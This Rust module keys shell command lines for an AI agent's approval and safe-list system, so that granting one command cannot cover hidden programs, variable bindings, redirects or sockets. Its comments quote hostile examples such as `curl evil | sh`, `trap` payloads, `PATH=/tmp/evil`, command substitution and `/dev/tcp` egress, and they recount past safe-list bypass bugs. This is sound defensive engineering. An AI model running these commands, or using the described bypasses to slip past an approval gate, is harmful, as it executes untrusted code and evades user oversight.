//! Turning a shell command line into the keys a grant is remembered under.
//!
//! Keying a grant on the bare tool name would make approving one `shell` call
//! approve *every* later one: "allow `ls`" would silently become "allow
//! `curl evil | sh`". So a shell grant is keyed on what actually runs, one key
//! per command in the line, and a later call is covered only when **every**
//! command in it is already covered. A grant can never widen to a program the
//! user has not seen run.
//!
//! The same key space is what `[safe_commands] shell` entries live in, so
//! "this is pre-approved" and "the user approved this" are one lookup rather
//! than two mechanisms that have to agree about shell syntax.
//!
//! The parser here is deliberately not a shell. It answers one question - what
//! does this line decide about what executes - and every case it cannot answer
//! confidently makes the whole line ungrantable, because "approve this once and
//! ask again next time" is the safe direction.
//!
//! **A key names everything in a segment that decides what executes, not just
//! the program.** Naming only the program is the shape of bug this module has
//! shipped more than once: `PATH=/tmp/evil ls` keyed a bare `ls`, `trap "curl
//! evil" EXIT; ls` keyed a bare `ls`, and both rode the default safe list into
//! an unprompted execution of somebody else's code. So a segment also yields an
//! `env:NAME` key for each variable it binds (`ENV_BINDING`, and `VAR=value`
//! prefixes), and a builtin that installs code to run later is refused outright
//! (`CODE_INSTALLING`). When adding a construct here, the question to ask is
//! not "does this run a program" but "could this change which program a later
//! word resolves to".

use std::collections::BTreeSet;

/// The namespace every shell key carries, so a key can never collide with the
/// bare tool name a non-shell grant uses.
pub const KEY_PREFIX: &str = "shell:";

/// Words that introduce a compound command and are followed by the program that
/// actually runs. They are stripped and parsing continues, so `do if grep -q x f`
/// keys `shell:grep` rather than `shell:do if`.
const PREFIX_KEYWORDS: &[&str] = &[
    "if", "elif", "then", "else", "do", "while", "until", "!", "{", "}",
];

/// Words that bind data, close a block, or are shell builtins that launch
/// nothing and bind no name. A segment starting with one of these runs no
/// program and changes nothing a later segment depends on, so it contributes no
/// key: this is what stops `for i in $(seq 1 11); do ...` producing
/// `shell:for i`.
///
/// `set` is here because it toggles shell options and positional parameters -
/// `set -euo pipefail` is in half the commands an agent writes and cannot
/// redirect what a later program resolves to. The builtins that *can* are in
/// [`ENV_BINDING`] and [`CODE_INSTALLING`].
const INERT_KEYWORDS: &[&str] = &[
    "for", "in", "case", "esac", "fi", "done", "select", "break", "continue", "return", "shift",
    "exit", "jobs", "disown", "wait", "set", "umask",
];

/// Builtins that bind a variable name, so the segment contributes an
/// `env:NAME` key per name it touches.
///
/// `export PATH=/tmp/evil` runs no program, but the next segment's `ls` is a
/// different `ls` because of it. Keying the name is what stops a safe-listed
/// program in a later segment silently covering the whole line.
const ENV_BINDING: &[&str] = &["export", "unset", "local", "readonly", "declare", "typeset"];

/// Builtins that install code to run later, at a point this parser cannot
/// attribute to any program. The whole line becomes ungrantable.
///
/// `trap "curl evil | sh" EXIT` runs on exit, `function ls { curl evil; }` and
/// `alias ls=...` replace a name a later segment resolves. In each case the
/// payload is a quoted word or a block, so no amount of naming programs in this
/// segment describes what will actually execute.
const CODE_INSTALLING: &[&str] = &["function", "trap", "alias", "unalias"];

/// Flags that turn an otherwise read-only program into one that writes a file
/// or runs another program, keyed by the program that accepts them.
///
/// This is a denylist, and a denylist has to be complete to be correct - so it
/// is used for exactly one thing: keeping an entry on the default safe list
/// that would otherwise have to be removed. `git`'s read-only subcommands are
/// most of what a coding agent does, but `--output=<file>` is a diff-machinery
/// option that `diff`, `log` and `show` all accept, and `git diff` is an exact
/// safe entry. Refusing the segment is cheaper than losing read-only git.
///
/// A program whose escape *cannot* be spelled as a flag does not belong here
/// and was removed from the safe list instead - see [`crate::approvals`], where
/// `uniq`'s output operand is the worked example. When in doubt, remove the
/// entry rather than extending this table: the entry is convenience, the rule
/// is the guarantee.
const ESCAPE_FLAGS: &[(&str, &[&str])] = &[("git", &["--output"])];

/// Whether this segment hands a safe-listed program a flag that lets it escape.
///
/// Prefix-matched, so `--output=x` and a separated `--output x` both hit.
fn carries_escape_flag(program: &str, words: &[Word]) -> bool {
    ESCAPE_FLAGS.iter().any(|(name, flags)| {
        *name == program
            && words
                .iter()
                .skip(1)
                .any(|w| flags.iter().any(|f| w.text.starts_with(f)))
    })
}

/// Programs that run a command assembled at runtime, so nothing in the line
/// names what will actually execute. A grant must never cover one of these.
///
/// `.` is `source` spelled the other way.
const UNREADABLE_PROGRAMS: &[&str] = &["eval", "source", "."];

/// Programs whose second word is payload rather than a second program, so
/// folding it into the key only splits one grant into many.
///
/// `cd` is here and is safe to be here: every shell call runs as a fresh
/// `sh -c` with `current_dir(&workdir)` (see `leviath_tools::exec`), so a `cd`
/// cannot outlive its own invocation and cannot execute anything. Keying it
/// with its path meant a run that worked in one directory re-prompted the first
/// time it worked in another, for a grant that names no program at all.
const NEVER_FOLD: &[&str] = &["cd", "echo", "printf"];

/// One word of a command line, with quotes already removed.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Word {
    /// The word's value.
    text: String,
    /// Whether that value is fully determined by the source text. An expansion
    /// clears it, because `$SCRIPT` names a different file on every run and
    /// folding it into a key would grant whatever it expands to next time.
    literal: bool,
    /// Whether any part of the word was quoted. A real subcommand is never
    /// quoted, so quoting is the signal that this word is the program's data -
    /// a grep pattern, a message, a here-string. Folding it in is what made a
    /// grant useless in practice: every distinct `grep` pattern became its own
    /// grant and the same search re-prompted forever.
    quoted: bool,
}

/// One command of a line: the words that decide what runs, and the targets it
/// writes to through a redirect.
///
/// Redirects are held apart from the words because they are not arguments to
/// the program - `cat a > b` runs `cat` and writes `b`, and the second half is
/// invisible to any key that names only the first.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
struct Segment {
    words: Vec<Word>,
    writes: Vec<Word>,
}

/// What a redirect writes to.
#[derive(Debug, Clone, PartialEq, Eq)]
enum WriteTarget {
    /// Nothing that outlives the call: `/dev/null` and the standard streams.
    Discarded,
    /// A path this can name, and so can key.
    Path(String),
    /// A target no key written today describes: a name that only exists after
    /// expansion, or one of bash's `/dev/tcp` and `/dev/udp` sockets, where the
    /// "file" is a connection to a host chosen at runtime.
    Unreadable,
}

/// Targets that accept a write and keep nothing, so writing to one grants
/// nothing and should cost no prompt. `2>/dev/null` opens a large share of the
/// commands an agent writes.
/// `/dev/tty` is deliberately **not** here. It is the user's controlling
/// terminal, not a sink: writing to it puts bytes on a real screen, which is
/// how OSC-52 clipboard writes and the rest of the escape-sequence family
/// reach a person. `/dev/stdout` and `/dev/stderr` are the shell tool's own
/// captured pipes, so those really do go nowhere a person sees unprompted.
const DISCARDING_TARGETS: &[&str] = &["/dev/null", "/dev/stdout", "/dev/stderr"];

/// Windows' null device, matched case-insensitively and on every platform.
///
/// `> NUL` is what `> /dev/null` is written as on Windows, and charging a
/// prompt for one spelling while the other is free would make the same command
/// behave differently depending on who ran it. CI caught exactly that: a test
/// whose Windows arm silences output with `> NUL` started being refused.
///
/// Unconditional rather than `#[cfg(windows)]`, which would need a platform
/// twin to satisfy the coverage gate and would buy almost nothing. On Unix
/// `> NUL` really does create a file - but one named exactly `NUL`, in the
/// workdir, with no path control at all. That is not a capability worth a
/// prompt, and it is a different thing entirely from the arbitrary-path writes
/// this module exists to catch.
const NULL_DEVICE_NAMES: &[&str] = &["NUL"];

/// Path prefixes that are a network connection rather than a file. Bash opens
/// `> /dev/tcp/host/port` as a socket, which makes a redirect an egress channel
/// that no program name in the line describes.
const NETWORK_TARGET_PREFIXES: &[&str] = &["/dev/tcp/", "/dev/udp/"];

/// Classify what a redirect's target word writes to.
fn classify_write(target: &Word) -> WriteTarget {
    if !target.literal {
        return WriteTarget::Unreadable;
    }
    let text = target.text.as_str();
    if DISCARDING_TARGETS.contains(&text)
        || text.starts_with("/dev/fd/")
        || NULL_DEVICE_NAMES
            .iter()
            .any(|n| text.eq_ignore_ascii_case(n))
    {
        return WriteTarget::Discarded;
    }
    if NETWORK_TARGET_PREFIXES.iter().any(|p| text.starts_with(p)) {
        return WriteTarget::Unreadable;
    }
    WriteTarget::Path(target.text.clone())
}

/// The key naming a write.
///
/// `is_valid_prefix` rejects anything starting with `>`, so there is no
/// `[safe_commands] shell` entry that covers a write and none can be added. A
/// write is approved by a person, per target, or not at all, which is what the
/// safe list's own admission rule ("must not be able to write a file")
/// demands.
fn write_key(path: &str) -> String {
    format!(">{path}")
}

/// What one segment of a line contributes.
///
/// Three states rather than an `Option`, because "nothing runs here" and "I
/// cannot read this" have opposite consequences: the first contributes no key
/// and lets the rest of the line stand, the second makes the whole line
/// ungrantable.
///
/// A segment yields more than one key when it decides more than one thing:
/// `PATH=/tmp/evil ls` runs `ls`, but *which* `ls` is decided by the
/// assignment, so it contributes both `ls` and `env:PATH`.
#[derive(Debug, Clone, PartialEq, Eq)]
enum SegmentKey {
    Keys(Vec<String>),
    NothingRuns,
    Unreadable,
}

impl SegmentKey {
    /// `NothingRuns` for an empty set, so a segment that turned out to decide
    /// nothing reads as such rather than as an empty grant.
    fn from_keys(keys: Vec<String>) -> Self {
        if keys.is_empty() {
            Self::NothingRuns
        } else {
            Self::Keys(keys)
        }
    }
}

/// The keys covering `command`, sorted and deduped, each prefixed with
/// [`KEY_PREFIX`].
///
/// Empty means the line is not grantable at all: either nothing in it runs a
/// program, or some part of it could not be read.
pub(crate) fn command_keys(command: &str) -> Vec<String> {
    let Some(segments) = tokenize(command) else {
        return Vec::new();
    };
    keys_from_segments(&segments)
}

/// The keys a tokenized line yields.
///
/// Split from [`command_keys`] so a caller that has already tokenized - a test
/// pinning one shell's escape rule against the other - reads the same
/// implementation rather than a second copy that could drift from it.
fn keys_from_segments(segments: &[Segment]) -> Vec<String> {
    let mut keys = BTreeSet::new();
    for segment in segments {
        match segment_key(&segment.words) {
            SegmentKey::Keys(found) => {
                keys.extend(found.into_iter().map(|k| format!("{KEY_PREFIX}{k}")));
            }
            SegmentKey::NothingRuns => {}
            // One unreadable command is enough: the line as a whole runs
            // something this cannot name, and a grant must not cover it.
            SegmentKey::Unreadable => return Vec::new(),
        }
        for target in &segment.writes {
            match classify_write(target) {
                WriteTarget::Discarded => {}
                WriteTarget::Path(path) => {
                    keys.insert(format!("{KEY_PREFIX}{}", write_key(&path)));
                }
                // Same rule as an unreadable program: a write this cannot name
                // must not be covered by a grant that names something else.
                WriteTarget::Unreadable => return Vec::new(),
            }
        }
    }
    keys.into_iter().collect()
}

/// Whether every key in `keys` is already covered, so the call runs unprompted.
///
/// The two predicates are deliberately not interchangeable. `safe` is the
/// pre-approved set and is widened through [`program_of`], so a safe-listed
/// `cat` covers `cat notes.md`. `granted` is what a person actually approved
/// during this run, and is **not** widened: an approval is for the thing they
/// were shown, and widening it would let a granted `git log` cover
/// `git log > ~/.bashrc`.
///
/// An empty key list is never covered. A line this cannot characterize is one no
/// grant may speak for, so it prompts every time.
///
/// Extracted so the daemon's `AgentToolState::covers` and the tests that pin
/// this behaviour run the same code. Asserting on key *strings* instead would
/// pass against a fix that emitted the right key and still let it be covered,
/// which is exactly how the safe-list escapes went unnoticed.
///
/// `&dyn Fn` rather than a generic: one instantiation, so the coverage gate sees
/// one set of regions instead of one per call site.
pub(crate) fn all_covered(
    keys: &[String],
    safe: &dyn Fn(&str) -> bool,
    granted: &dyn Fn(&str) -> bool,
) -> bool {
    !keys.is_empty()
        && keys
            .iter()
            .all(|k| safe(k) || safe(program_of(k)) || granted(k))
}

/// Whether `command` writes a file through a shell redirect.
///
/// A redirect is a file write that no tool name describes, so the caller
/// clamps the call by the write tool's policy rather than the shell's alone.
/// Without that, `write_file = "deny"` was bypassable with `echo x > file`.
///
/// Conservative on an unparseable line: a line this cannot read is treated as
/// writing, because the alternative is deciding it does not on evidence that
/// was already too weak to name its programs.
pub(crate) fn writes_a_file(command: &str) -> bool {
    let Some(segments) = tokenize(command) else {
        return true;
    };
    segments.iter().any(|segment| {
        segment
            .writes
            .iter()
            .any(|t| classify_write(t) != WriteTarget::Discarded)
    })
}

/// Where a line's redirects go, as far as this can read them.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum WriteTargets {
    /// Every literal path the line redirects a write to.
    Known(Vec<String>),
    /// The line has a `>` in it and cannot be read as commands: a heredoc, a
    /// backtick, an unterminated quote or an unbalanced `$(` sits somewhere
    /// on it, so where the redirect lands is not knowable from here.
    Unreadable,
}

/// Where `command` redirects writes to.
///
/// [`writes_a_file`] answers whether to clamp by the write policy; this answers
/// *where*, so a caller can hold a redirect to the same workspace confinement
/// `write_file` enforces.
///
/// Discarded targets (`/dev/null` and friends) are absent because they write
/// nothing anyone can read back. A target through a variable (`> $OUT`) is
/// absent too: it names a path only the shell will know, and such a line is
/// already ungrantable by [`writes_a_file`] and prompts every time, which is
/// the containment it gets.
///
/// A line that will not tokenize is different: it is
/// [`WriteTargets::Unreadable`] when it holds a `>` at all, and the caller
/// refuses it rather than guessing. Leaning on the prompt instead is not
/// containment, because under `--yolo` a prompt is a yes, and `cat <<EOF >
/// /tmp/pwned` would write outside the tree where `write_file` on the same
/// path is refused.
pub(crate) fn write_targets(command: &str) -> WriteTargets {
    let Some(segments) = tokenize(command) else {
        return match command.contains('>') {
            true => WriteTargets::Unreadable,
            false => WriteTargets::Known(Vec::new()),
        };
    };
    WriteTargets::Known(
        segments
            .iter()
            .flat_map(|segment| segment.writes.iter())
            .filter_map(|t| match classify_write(t) {
                WriteTarget::Path(p) => Some(p),
                WriteTarget::Discarded | WriteTarget::Unreadable => None,
            })
            .collect(),
    )
}

/// The literal paths of [`write_targets`], with an unreadable line yielding
/// none. For callers that report rather than refuse.
pub(crate) fn write_target_paths(command: &str) -> Vec<String> {
    match write_targets(command) {
        WriteTargets::Known(paths) => paths,
        WriteTargets::Unreadable => Vec::new(),
    }
}

/// The program half of a key, dropping any folded subcommand or argument.
///
/// This is what makes a safe-command entry cover a family rather than a single
/// invocation. A call to `cat notes.md` keys `shell:cat notes.md`, and an entry
/// of `cat` keys `shell:cat`; without this they would never meet and naming a
/// program as safe would do nothing for any call that passed it an argument.
///
/// The widening is one-directional and deliberate. It applies to entries a user
/// wrote in their own config, where naming `cat` means every `cat`. A grant made
/// at a prompt still matches exactly, so approving `git diff` never covers
/// `git push`.
pub(crate) fn program_of(key: &str) -> &str {
    match key.split_once(' ') {
        Some((program, _)) => program,
        None => key,
    }
}

/// Whether `entry` is usable as a `[safe_commands] shell` entry.
///
/// Defined as "derives back to exactly itself", so there is one grammar rather
/// than two: anything the matcher would read as more than one command, as a
/// keyword, or as an expansion is rejected here without a second
/// implementation that could drift from the first.
///
/// A write key is refused on top of that rule rather than by it, because a bare
/// `>out` *does* derive back to itself and would otherwise become a
/// pre-approvable write. A write is approved by a person, per target, or not at
/// all, which is what the safe list's own admission rule demands.
pub(crate) fn is_valid_prefix(entry: &str) -> bool {
    !entry.starts_with('>') && command_keys(entry) == [format!("{KEY_PREFIX}{entry}")]
}

/// Split a line into its commands, or `None` when it cannot be read as a list
/// of commands.
///
/// The four `None` cases are all "this line contains a construct whose contents
/// decide what runs, and reading it wrong would understate the grant": an
/// unterminated quote, an unterminated `$(`, a backtick (same idea as `$(`, but
/// nesting is ambiguous), and a heredoc (whose body has its own delimiter
/// grammar).
fn tokenize(command: &str) -> Option<Vec<Segment>> {
    tokenize_for(command, BACKSLASH_ESCAPES)
}

/// Whether the shell these keys describe reads `\` as an escape character.
///
/// It does in `sh`; it does not in `cmd.exe`, where `\` is the path separator.
/// Reading it wrong is not cosmetic: `cat C:\Users\me\notes.md` was keyed as
/// `shell:cat C:Usersmenotes.md`, so a Windows user's grants were recorded
/// against paths that do not exist, and anything comparing a key to a real path
/// compared the wrong string.
///
/// Matched to the platform rather than to the resolved shell. `BuiltinTools`
/// picks `$SHELL` on Unix and `cmd.exe` on Windows, and a Unix user whose
/// `$SHELL` is not POSIX-ish is already outside what this parser models.
const BACKSLASH_ESCAPES: bool = cfg!(not(windows));

/// [`tokenize`] with the escape rule supplied, so both readings are testable on
/// either platform.
fn tokenize_for(command: &str, backslash_escapes: bool) -> Option<Vec<Segment>> {
    let mut lex = Lexer::default();
    let escapes = backslash_escapes;
    let mut chars = command.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                // Single quotes suppress every expansion, so the contents are
                // as determined as a bare word - but still quoted, so still
                // data rather than a subcommand.
                lex.begin_word();
                lex.quoted = true;
                loop {
                    let q = chars.next()?;
                    if q == '\'' {
                        break;
                    }
                    lex.word.push(q);
                }
            }
            '"' => {
                lex.begin_word();
                lex.quoted = true;
                loop {
                    match chars.next()? {
                        '"' => break,
                        '\\' if escapes => {
                            // Inside double quotes a backslash escapes only the
                            // four characters that would otherwise be special;
                            // anywhere else it stands for itself.
                            let e = chars.next()?;
                            if !matches!(e, '$' | '"' | '\\' | '`') {
                                lex.word.push('\\');
                            }
                            lex.word.push(e);
                        }
                        '`' => return None,
                        '$' => lex.take_dollar(&mut chars, escapes)?,
                        q => lex.word.push(q),
                    }
                }
            }
            '`' => return None,
            '\\' if escapes => {
                lex.begin_word();
                lex.word.push(chars.next()?);
            }
            // Not an escape on this shell, so it is data - and on Windows it is
            // the path separator, which is the whole reason this branch exists.
            '\\' => {
                lex.begin_word();
                lex.word.push('\\');
            }
            '$' => {
                lex.begin_word();
                lex.take_dollar(&mut chars, escapes)?;
            }
            // A heredoc body has its own delimiter grammar, which is more than
            // a grant key is worth reading.
            '<' if chars.peek() == Some(&'<') => return None,
            '>' | '<' => {
                // A file descriptor written in front of the operator (`2>`) is
                // part of it, not a word of its own.
                if !lex.word.chars().all(|d| d.is_ascii_digit()) {
                    lex.end_word();
                }
                lex.discard_word();
                if chars.peek() == Some(&c) {
                    chars.next();
                }
                // `>|` forces the truncation `noclobber` would refuse. Consuming
                // the bar here is what stops it reading as a pipe, which made
                // the target of `ls >| out` parse as a program named `out`.
                if c == '>' && chars.peek() == Some(&'|') {
                    chars.next();
                }
                // `>&1` duplicates a descriptor; that `&` belongs to the
                // target, not to a separator. A descriptor is not a file, so
                // nothing is written that this has to name.
                let dup = chars.peek() == Some(&'&');
                if dup {
                    chars.next();
                }
                // `<>` opens the target O_RDWR, so it is a write however it
                // reads. Checked before the `<` arm, which is otherwise a read
                // and grants nothing a safe program could not already do.
                let read_write = c == '<' && chars.peek() == Some(&'>');
                if read_write {
                    chars.next();
                }
                lex.swallow = Some(match (c, dup, read_write) {
                    (_, true, _) => Swallow::Other,
                    ('>', _, _) | (_, _, true) => Swallow::Write,
                    _ => Swallow::Other,
                });
            }
            '&' if chars.peek() == Some(&'>') => {
                chars.next();
                lex.end_word();
                lex.swallow = Some(Swallow::Write);
            }
            ';' | '&' | '|' | '\n' | '(' | ')' => {
                // A doubled `&&` or `||` is one separator, and a subshell paren
                // is a command boundary like any other.
                if (c == '&' || c == '|') && chars.peek() == Some(&c) {
                    chars.next();
                }
                lex.end_word();
                lex.end_segment();
            }
            c if c.is_whitespace() => lex.end_word(),
            _ => {
                lex.begin_word();
                lex.word.push(c);
            }
        }
    }
    lex.end_word();
    lex.end_segment();
    Some(lex.segments)
}

/// The tokenizer's mutable state, gathered so the character loop reads as the
/// grammar it implements rather than as five `&mut` arguments threaded through
/// every call.
#[derive(Default)]
struct Lexer {
    segments: Vec<Segment>,
    current: Vec<Word>,
    /// Write targets seen in the segment being accumulated.
    writes: Vec<Word>,
    word: String,
    in_word: bool,
    literal: bool,
    quoted: bool,
    /// Set by a redirect operator: the next word names a file, not a program.
    swallow: Option<Swallow>,
}

/// What the word a redirect claimed is going to be used for.
///
/// Only a write needs naming. A read redirect grants nothing a program could
/// not already do - `cat` reads any file the user can - and a descriptor
/// duplication names no file at all.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Swallow {
    Write,
    Other,
}

impl Lexer {
    /// Start accumulating a word, if one is not already open.
    fn begin_word(&mut self) {
        if !self.in_word {
            self.in_word = true;
            self.literal = true;
            self.quoted = false;
        }
    }

    /// End the word being accumulated, appending it to the segment's words -
    /// or, when a redirect claimed it, to its write targets.
    fn end_word(&mut self) {
        if self.in_word {
            let word = Word {
                text: std::mem::take(&mut self.word),
                literal: self.literal,
                quoted: self.quoted,
            };
            match self.swallow.take() {
                Some(Swallow::Write) => self.writes.push(word),
                Some(Swallow::Other) => {}
                None => self.current.push(word),
            }
        }
        self.discard_word();
    }

    /// Drop the partial word without emitting it, used where the characters
    /// gathered so far turned out to belong to an operator.
    fn discard_word(&mut self) {
        self.word.clear();
        self.in_word = false;
        self.literal = true;
        self.quoted = false;
    }

    fn end_segment(&mut self) {
        // A redirect operator with no word after it (`ls >`) is a malformed
        // line; dropping the pending claim here keeps it from swallowing the
        // first word of the next segment.
        self.swallow = None;
        self.segments.push(Segment {
            words: std::mem::take(&mut self.current),
            writes: std::mem::take(&mut self.writes),
        });
    }

    /// Consume whatever follows a `$`.
    ///
    /// `$(( ))` is arithmetic: it computes a number and runs nothing, so it
    /// only marks the word as expanded. `$( )` is a command substitution, which
    /// runs a command *inside* this one, so its contents become their own
    /// segment - otherwise `echo $(curl evil)` would grant only `echo`, and a
    /// later `echo $(curl evil)` would be covered by an earlier harmless one.
    fn take_dollar(
        &mut self,
        chars: &mut std::iter::Peekable<std::str::Chars>,
        escapes: bool,
    ) -> Option<()> {
        self.literal = false;
        if chars.peek() != Some(&'(') {
            return Some(());
        }
        chars.next();
        if chars.peek() == Some(&'(') {
            chars.next();
            take_substitution(chars)?;
            // The second half of the closing `))`.
            match chars.next() {
                Some(')') => return Some(()),
                _ => return None,
            }
        }
        let inner = take_substitution(chars)?;
        self.segments.extend(tokenize_for(&inner, escapes)?);
        Some(())
    }
}

/// Take the text of a `$(...)` up to its matching `)`, leaving `chars` just
/// past it. `None` when the parens never balance.
fn take_substitution(chars: &mut std::iter::Peekable<std::str::Chars>) -> Option<String> {
    let mut depth = 0usize;
    let mut inner = String::new();
    loop {
        let c = chars.next()?;
        match c {
            '(' => depth += 1,
            ')' if depth == 0 => return Some(inner),
            ')' => depth -= 1,
            _ => {}
        }
        inner.push(c);
    }
}

/// The keys one command contributes: the program, plus the second word when
/// that word narrows *which* program runs rather than being a flag, a number,
/// or the program's data, plus an `env:NAME` key for every variable the segment
/// binds.
///
/// The rule the three key families share: **a key names everything in the
/// segment that decides what executes.** A program name alone does not, which
/// is what made `PATH=/tmp/evil ls` read as a plain `ls` and ride the safe list
/// into an unprompted execution of somebody else's binary.
fn segment_key(words: &[Word]) -> SegmentKey {
    let mut env_keys = Vec::new();
    let mut rest = words;
    // Strip leading keywords and `VAR=value` assignments until a program is
    // reached. `FOO=1 do cargo test` keys `shell:cargo test` and `shell:env:FOO`.
    loop {
        let Some(first) = rest.first() else {
            return SegmentKey::from_keys(env_keys);
        };
        let text = first.text.as_str();
        if INERT_KEYWORDS.contains(&text) {
            return SegmentKey::from_keys(env_keys);
        }
        if CODE_INSTALLING.contains(&text) {
            return SegmentKey::Unreadable;
        }
        if ENV_BINDING.contains(&text) {
            return match binding_keys(&rest[1..], &mut env_keys) {
                Ok(()) => SegmentKey::from_keys(env_keys),
                Err(()) => SegmentKey::Unreadable,
            };
        }
        if PREFIX_KEYWORDS.contains(&text) {
            rest = &rest[1..];
            continue;
        }
        if let Some(name) = assignment_name(first) {
            env_keys.push(env_key(name));
            rest = &rest[1..];
            continue;
        }
        break;
    }
    let program = &rest[0];
    // A program named by an expansion cannot be keyed: `$CMD` is a different
    // program on every run, and a key naming it would grant all of them. The
    // same is true of a program whose whole job is running a command assembled
    // somewhere this cannot see.
    if !program.literal || UNREADABLE_PROGRAMS.contains(&program.text.as_str()) {
        return SegmentKey::Unreadable;
    }
    if carries_escape_flag(&program.text, rest) {
        return SegmentKey::Unreadable;
    }
    match rest.get(1) {
        Some(arg) if folds_into_key(&program.text, arg) => {
            env_keys.push(format!("{} {}", program.text, arg.text));
        }
        _ => env_keys.push(program.text.clone()),
    }
    SegmentKey::Keys(env_keys)
}

/// The key naming a bound variable.
///
/// The `env:` namespace is deliberately one token with no space, so
/// [`program_of`] cannot widen a safe-list entry onto it: naming `env` as a safe
/// command grants nothing, and there is no spelling of a `[safe_commands]` entry
/// that covers every variable at once. A user who wants one grants it by name.
fn env_key(name: &str) -> String {
    format!("env:{name}")
}

/// Collect the names an [`ENV_BINDING`] builtin touches, or `Err` when one of
/// them cannot be read.
///
/// Flags are skipped (`declare -x FOO` binds `FOO`), and a name supplied by an
/// expansion is refused outright: `export $VAR` binds whatever `$VAR` says this
/// run, so no key written today describes it.
fn binding_keys(args: &[Word], out: &mut Vec<String>) -> Result<(), ()> {
    for arg in args {
        if arg.text.starts_with('-') || arg.text.starts_with('+') {
            continue;
        }
        if !arg.literal {
            return Err(());
        }
        let name = arg
            .text
            .split_once('=')
            .map_or(arg.text.as_str(), |(n, _)| n);
        if !is_variable_name(name) {
            return Err(());
        }
        out.push(env_key(name));
    }
    Ok(())
}

/// The variable name a `VAR=value` prefix binds, or `None` when the word is a
/// program rather than an assignment.
fn assignment_name(word: &Word) -> Option<&str> {
    let (name, _) = word.text.split_once('=')?;
    is_variable_name(name).then_some(name)
}

/// Whether `name` is spelled the way a shell variable is.
fn is_variable_name(name: &str) -> bool {
    !name.is_empty()
        && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Whether `arg` narrows which program runs, and so belongs in the key.
///
/// `git diff` rather than `git`, because `git` alone would cover `git push`.
/// `ls` rather than `ls -la`, because a flag does not change what the program
/// is. `sleep` rather than `sleep 55`, because a duration does not either - and
/// keying it meant `sleep 45`, `sleep 50` and `sleep 55` were three grants for
/// one program. `grep` rather than `grep '^EXIT:'`, because a quoted argument
/// is the program's data and every distinct pattern would be its own grant.
///
/// Folding is a narrowing: a word that stays out of the key makes the grant
/// cover more, so each exclusion here is a deliberate trade of precision for a
/// grant that applies more than once. The floor is that the program is always
/// named, and the user approved a command they could read.
fn folds_into_key(program: &str, arg: &Word) -> bool {
    arg.literal
        && !arg.quoted
        && !NEVER_FOLD.contains(&program)
        && !arg.text.is_empty()
        && !arg.text.starts_with('-')
        && !arg.text.starts_with(|c: char| c.is_ascii_digit())
}

#[cfg(test)]
mod tests;
